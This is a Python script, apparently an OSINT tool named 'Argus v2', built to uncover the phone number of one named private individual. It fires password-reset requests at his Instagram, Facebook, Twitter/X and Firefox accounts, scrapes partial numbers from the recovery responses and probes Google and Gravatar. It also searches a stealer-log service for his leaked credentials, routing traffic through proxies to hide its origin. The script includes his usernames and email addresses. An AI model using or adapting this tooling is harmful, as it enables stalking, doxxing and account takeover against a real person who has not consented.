#!/usr/bin/env python3
"""
Argus v2 — Direct API-level probing, no JS rendering needed.
Focus on endpoints that return JSON and actually reveal phone info.
"""
import json, os, re, subprocess, sys, time, urllib.request, urllib.parse, urllib.error, http.client

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

def run(cmd, t=20):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t,
            env={**os.environ, "PATH": os.path.expanduser("~/.local/bin") + ":" + os.environ.get("PATH","")})
        return r.stdout.strip()
    except: return ""

print("""
╔══════════════════════════════════════════════════════════╗
║  ARGUS v2 — Direct API Phone Intelligence                ║
║  Target: Luigi Savino                                    ║
╚══════════════════════════════════════════════════════════╝
""")

# ═══════════════════════════════════════════════════
# VECTOR 1: Instagram Reset (retry with fresh session)
# ═══════════════════════════════════════════════════
print("[VECTOR 1] INSTAGRAM PASSWORD RESET (fresh session)")
try:
    # Get fresh CSRF
    conn = http.client.HTTPSConnection("www.instagram.com", timeout=15)
    conn.request("GET", "/accounts/password/reset/", headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })
    resp = conn.getresponse()
    body = resp.read().decode(errors="ignore")
    csrf = re.search(r'"csrf_token":"([^"]+)"', body)
    
    # Get cookies from response
    cookies = []
    for h in resp.getheaders():
        if h[0].lower() == "set-cookie":
            cookies.append(h[1].split(";")[0])
    cookie_str = "; ".join(cookies)
    
    if csrf:
        time.sleep(2)
        # Send reset with proper cookies
        data = urllib.parse.urlencode({"email_or_username": "luigisav", "recaptcha_challenge_field": ""}).encode()
        conn2 = http.client.HTTPSConnection("www.instagram.com", timeout=15)
        conn2.request("POST", "/accounts/account_recovery_send_ajax/", body=data, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-CSRFToken": csrf.group(1),
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/accounts/password/reset/",
            "Cookie": f"csrftoken={csrf.group(1)}; {cookie_str}",
            "Content-Type": "application/x-www-form-urlencoded",
        })
        resp2 = conn2.getresponse()
        body2 = resp2.read().decode(errors="ignore")
        print(f"  Status: {resp2.status}")
        try:
            d = json.loads(body2)
            print(f"  Title: {d.get('title', '?')}")
            print(f"  Body: {d.get('body', '?')}")
            print(f"  Contact: {d.get('contact_point', '?')}")
            print(f"  Method: {d.get('recovery_method', '?')}")
            
            # KEY: if recovery_method == "send_sms" -> contact_point has phone partial!
            if "sms" in d.get("recovery_method", "").lower():
                print(f"  *** PHONE PARTIAL FROM IG: {d.get('contact_point')} ***")
            elif "email" in d.get("recovery_method", "").lower():
                print(f"  → Email-based recovery: {d.get('contact_point')}")
                print(f"  → Phone NOT linked to IG or email is primary method")
        except:
            print(f"  Raw: {body2[:300]}")
    else:
        print(f"  CSRF not found (page status: {resp.status})")
except Exception as e:
    print(f"  Error: {e}")

time.sleep(3)

# ═══════════════════════════════════════════════════
# VECTOR 2: Instagram Private API — lookup by phone (reverse)
# ═══════════════════════════════════════════════════
print("\n[VECTOR 2] INSTAGRAM PRIVATE API — USERS LOOKUP")
try:
    # Try getting user info with all available fields
    req = urllib.request.Request(
        "https://i.instagram.com/api/v1/users/284908554/info/",
        headers={
            "User-Agent": "Instagram 275.0.0.27.98 Android (26/8.0.0; 480dpi; 1080x1920; samsung; SM-G950F; dreamlte; samsungexynos8895; en_US; 211900014)",
            "X-IG-App-ID": "936619743392459",
        }
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        data = json.loads(r.read())
        user = data.get("user", {})
        # Dump ALL fields that might contain phone
        phone_fields = {}
        for k, v in user.items():
            if "phone" in k.lower() or "contact" in k.lower() or "whatsapp" in k.lower():
                phone_fields[k] = v
            elif isinstance(v, str) and re.match(r'^\+?\d{10,}$', v.replace(" ", "")):
                phone_fields[k] = v
        
        if phone_fields:
            print(f"  PHONE-RELATED FIELDS:")
            for k, v in phone_fields.items():
                print(f"    {k}: {v}")
        else:
            print(f"  No phone fields in public user info")
        
        # Print other useful fields
        print(f"  category: {user.get('category', '')}")
        print(f"  is_business: {user.get('is_business', '')}")
        print(f"  public_email: {user.get('public_email', '')}")
        print(f"  city_name: {user.get('city_name', '')}")
        print(f"  account_type: {user.get('account_type', '')}")
except Exception as e:
    print(f"  Error: {e}")

time.sleep(2)

# ═══════════════════════════════════════════════════
# VECTOR 3: Facebook — mbasic forgot password with proxy
# ═══════════════════════════════════════════════════
print("\n[VECTOR 3] FACEBOOK PASSWORD RESET (mbasic + proxy)")
try:
    raw = run('proxychains4 -q curl -sL "https://mbasic.facebook.com/login/identify/?ctx=recover" -H "User-Agent: Mozilla/5.0 (Linux; Android 12)" -c /tmp/fb_cookies.txt 2>/dev/null', 15)
    
    # Find form and tokens
    lsd = re.search(r'name="lsd" value="([^"]+)"', raw)
    jazoest = re.search(r'name="jazoest" value="([^"]+)"', raw)
    action = re.search(r'action="([^"]*identify[^"]*)"', raw)
    
    if lsd:
        print(f"  Form tokens found (lsd: {lsd.group(1)[:10]}...)")
        time.sleep(2)
        
        # Submit email to identify account
        post_data = f"lsd={lsd.group(1)}&email=luigi.savino.95%40gmail.com"
        if jazoest:
            post_data += f"&jazoest={jazoest.group(1)}"
        
        url = action.group(1) if action else "/login/identify/?ctx=recover"
        if not url.startswith("http"):
            url = "https://mbasic.facebook.com" + url
        
        raw2 = run(f'proxychains4 -q curl -sL "{url}" -X POST -d "{post_data}" -H "User-Agent: Mozilla/5.0 (Linux; Android 12)" -b /tmp/fb_cookies.txt -c /tmp/fb_cookies2.txt 2>/dev/null', 15)
        
        # Search for phone partial in the recovery options page
        phone_hints = re.findall(r'(\+39[\s\*]+[\d\*\s]+\d{2,4})', raw2)
        phone_hints2 = re.findall(r'(\*+\s*\d{2,4})', raw2)
        phone_hints3 = re.findall(r'SMS.*?(\d[\d\s\*]+\d)', raw2)
        ending = re.findall(r'(?:ending|finisce|termina)\s*(?:in|con|with)?\s*(\d{2,4})', raw2, re.IGNORECASE)
        
        all_hints = phone_hints + phone_hints2 + phone_hints3 + ending
        
        if all_hints:
            for h in all_hints:
                print(f"  *** PHONE PARTIAL: {h} ***")
        else:
            # Check what recovery options are available
            sms_option = re.search(r'(?:SMS|sms|text|messaggio).*?(\+?[\d\s\*]+)', raw2)
            email_option = re.search(r'(?:email|posta).*?([a-z\*]+@[a-z.]+)', raw2, re.IGNORECASE)
            
            if sms_option:
                print(f"  SMS option found: {sms_option.group(1)}")
            if email_option:
                print(f"  Email option: {email_option.group(1)}")
            
            # Check if we see the account
            name_match = re.search(r'(?:Is this your account|Questo)\s*.*?<[^>]*>([^<]+)<', raw2)
            if name_match:
                print(f"  Account identified: {name_match.group(1)}")
            
            # Look for any recovery method mentions
            methods = re.findall(r'(?:Send|Invia|Use|Usa)[^<]{0,100}', raw2)
            for m in methods[:5]:
                clean = re.sub(r'\s+', ' ', m).strip()
                if len(clean) > 10:
                    print(f"  Method: {clean[:80]}")
    else:
        print(f"  Could not get form tokens")
        # Check if blocked
        if "checkpoint" in raw.lower() or "captcha" in raw.lower():
            print(f"  Facebook is showing captcha/checkpoint")
except Exception as e:
    print(f"  Error: {e}")

time.sleep(3)

# ═══════════════════════════════════════════════════
# VECTOR 4: Google account type check (has phone?)
# ═══════════════════════════════════════════════════
print("\n[VECTOR 4] GOOGLE ACCOUNT INTELLIGENCE")
for email in ["luigi.savino.95@gmail.com", "luxdj95@gmail.com"]:
    print(f"\n  Probing: {email}")
    raw = run(f'proxychains4 -q curl -sL "https://accounts.google.com/AccountChooser?Email={urllib.parse.quote(email)}&continue=https://myaccount.google.com/" -H "User-Agent: Mozilla/5.0" 2>/dev/null | head -c 15000', 15)
    
    # Look for any phone info in the response
    phone_patterns = [
        r'"phoneNumber"[^}]*?"([^"]*\d{2,}[^"]*)"',
        r'"obfuscatedPhoneNumber":"([^"]+)"',
        r'(\+\d{1,3}\s*\*[\d\*\s]+\d{2,4})',
        r'phone.*?(\d[\d\*\s\-]{8,}\d)',
    ]
    for pat in phone_patterns:
        matches = re.findall(pat, raw)
        if matches:
            for m in matches:
                print(f"  *** GOOGLE PHONE: {m} ***")
    
    # Check if 2FA is enabled (indicates phone is linked)
    if "2-Step" in raw or "2step" in raw.lower() or "verif" in raw.lower():
        print(f"  Possible 2FA enabled")
    time.sleep(2)

# ═══════════════════════════════════════════════════
# VECTOR 5: Twitter/X — luxdj95 account recovery
# ═══════════════════════════════════════════════════
print("\n[VECTOR 5] TWITTER/X RECOVERY (luxdj95)")
try:
    # Twitter begin_password_reset reveals partial phone
    raw = run('proxychains4 -q curl -s "https://twitter.com/i/api/1.1/account/begin_password_reset.json" -X POST -d "account_identifier=luxdj95" -H "User-Agent: TwitterAndroid/10.21.0-release.0" -H "Authorization: Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs=1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA" -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null', 15)
    if raw:
        print(f"  Response: {raw[:500]}")
        # Twitter shows: "We sent a code to ****47"
        phone_match = re.findall(r'(\+?\d[\d\*\s]{8,}\d{2,4})', raw)
        if phone_match:
            print(f"  *** TWITTER PHONE PARTIAL: {phone_match} ***")
    else:
        print(f"  No response")
except Exception as e:
    print(f"  Error: {e}")

time.sleep(2)

# ═══════════════════════════════════════════════════
# VECTOR 6: Firefox/Mozilla account (luxdj95)
# ═══════════════════════════════════════════════════
print("\n[VECTOR 6] FIREFOX ACCOUNT RECOVERY")
try:
    raw = run(f'curl -s "https://api.accounts.firefox.com/v1/account/status" -X POST -H "Content-Type: application/json" -d \'{{"email":"luxdj95@gmail.com"}}\' 2>/dev/null', 10)
    if raw:
        d = json.loads(raw)
        print(f"  Account exists: {d.get('exists', '?')}")
        # If exists, try recovery
        if d.get("exists"):
            raw2 = run(f'curl -s "https://api.accounts.firefox.com/v1/password/forgot/send_code" -X POST -H "Content-Type: application/json" -d \'{{"email":"luxdj95@gmail.com"}}\' 2>/dev/null', 10)
            print(f"  Recovery: {raw2[:200]}")
except Exception as e:
    print(f"  Error: {e}")

# ═══════════════════════════════════════════════════
# VECTOR 7: Gravatar profile (luxdj95 — confirmed)
# ═══════════════════════════════════════════════════
print("\n[VECTOR 7] GRAVATAR PROFILE MINING")
import hashlib
for email in ["luxdj95@gmail.com", "luigi.savino.95@gmail.com"]:
    h = hashlib.md5(email.lower().strip().encode()).hexdigest()
    raw = run(f'curl -s "https://gravatar.com/{h}.json" 2>/dev/null', 10)
    if raw and "entry" in raw:
        try:
            d = json.loads(raw)
            for entry in d.get("entry", []):
                name = entry.get("displayName", "")
                phone_numbers = entry.get("phoneNumbers", [])
                urls = entry.get("urls", [])
                accounts = entry.get("accounts", [])
                print(f"  {email}: name={name}")
                if phone_numbers:
                    print(f"  *** GRAVATAR PHONE: {phone_numbers} ***")
                for u in urls[:3]:
                    print(f"    URL: {u.get('value', '')}")
                for a in accounts[:3]:
                    print(f"    Account: {a.get('shortname', '')}: {a.get('url', '')}")
        except:
            pass
    else:
        print(f"  {email}: no gravatar profile")

# ═══════════════════════════════════════════════════
# VECTOR 8: HudsonRock stealers (may contain full phone)
# ═══════════════════════════════════════════════════
print("\n[VECTOR 8] HUDSONROCK STEALER LOG CHECK")
for email in ["luigi.savino.95@gmail.com", "luxdj95@gmail.com"]:
    raw = run(f'curl -s "https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-email?email={email}" 2>/dev/null', 15)
    if raw:
        try:
            d = json.loads(raw)
            stealers = d.get("stealers", [])
            if stealers:
                print(f"  {email}: {len(stealers)} stealer(s)")
                for s in stealers[:3]:
                    print(f"    Date: {s.get('date_compromised','')} | PC: {s.get('computer_name','')} | IP: {s.get('ip','')}")
                    # Check top_passwords for phone-like strings
                    for cred in d.get("top_passwords", []):
                        if re.match(r'^\+?\d{10,}$', str(cred)):
                            print(f"    *** PHONE IN CREDENTIALS: {cred} ***")
            else:
                print(f"  {email}: clean")
        except:
            print(f"  {email}: parse error")
    time.sleep(2)

print(f"\n{'═'*60}")
print(f"  ARGUS v2 COMPLETE")
print(f"{'═'*60}")
